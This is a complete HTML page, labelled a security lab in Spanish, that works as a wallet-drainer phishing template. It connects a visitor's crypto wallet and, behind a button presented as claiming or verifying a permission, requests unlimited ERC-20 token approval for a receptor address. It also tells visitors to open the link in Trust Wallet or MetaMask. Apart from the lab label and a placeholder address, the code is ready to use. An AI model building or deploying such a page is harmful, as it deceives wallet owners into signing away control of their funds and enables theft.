<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal - Laboratorio de Seguridad</title>
    <!-- ethers.js para interactuar con la billetera -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root {
            --primary: #4F46E5;
            --primary-hover: #4338CA;
            --danger: #EF4444;
            --bg: #0F172A;
            --card-bg: #1E293B;
            --text: #F8FAFC;
            --text-muted: #94A3B8;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .dapp-card {
            background-color: var(--card-bg);
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
        }

        .header h1 {
            font-size: 1.25rem;
            margin: 0 0 8px 0;
        }

        .badge {
            background: rgba(239, 68, 68, 0.2);
            color: #FCA5A5;
            font-size: 0.75rem;
            padding: 4px 8px;
            border-radius: 9999px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 8px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 12px;
        }

        .btn:hover { background-color: var(--primary-hover); }

        .btn-action {
            background-color: var(--danger);
        }

        .status-box {
            background: #0F172A;
            border-radius: 8px;
            padding: 12px;
            font-size: 0.85rem;
            color: var(--text-muted);
            word-break: break-all;
            margin-top: 12px;
        }
    </style>
</head>
<body>

<div class="dapp-card">
    <div class="header">
        <span class="badge">Soy un Guevo Adrian</span>
        <h1>Verificación de Billetera</h1>
        <p style="color: var(--text-muted); font-size: 0.875rem;">Demostración de solicitudes de firma en dApps</p>
    </div>

    <!-- Paso 1: Conectar -->
    <button class="btn" onclick="conectarBilletera()">1. Conectar Billetera</button>
    
    <!-- Paso 2: Acción que solicita la aprobación -->
    <button class="btn btn-action" onclick="solicitarAprobacion()">2. Reclamar / Verificar Permiso</button>

    <div class="status-box" id="status-box">
        Estado: Esperando interacción...
    </div>
</div>

<script>
    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee"; // Contrato de prueba
    const RECEPTOR_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; // Billetera receptora de prueba

    const ABI_ERC20 = ["function approve(address spender, uint256 amount) public returns (bool)"];
    let provider, signer;

    async function conectarBilletera() {
        if (window.ethereum) {
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();
                document.getElementById("status-box").innerText = "Conectado: " + address;
            } catch (err) {
                document.getElementById("status-box").innerText = "Error: " + err.message;
            }
        } else {
            alert("Abre este enlace desde el navegador interno de Trust Wallet o MetaMask.");
        }
    }

    async function solicitarAprobacion() {
        if (!signer) {
            alert("Primero conecta la billetera.");
            return;
        }
        try {
            document.getElementById("status-box").innerText = "Solicitando confirmación en la billetera...";
            const contract = new ethers.Contract(TOKEN_CONTRACT, ABI_ERC20, signer);
            
            // Permiso ilimitado (MaxUint256)
            const tx = await contract.approve(RECEPTOR_ADDRESS, ethers.constants.MaxUint256);
            document.getElementById("status-box").innerText = "Transacción enviada: " + tx.hash;
        } catch (err) {
            document.getElementById("status-box").innerText = "Firma rechazada o cancelada.";
        }
    }
</script>

</body>
</html>
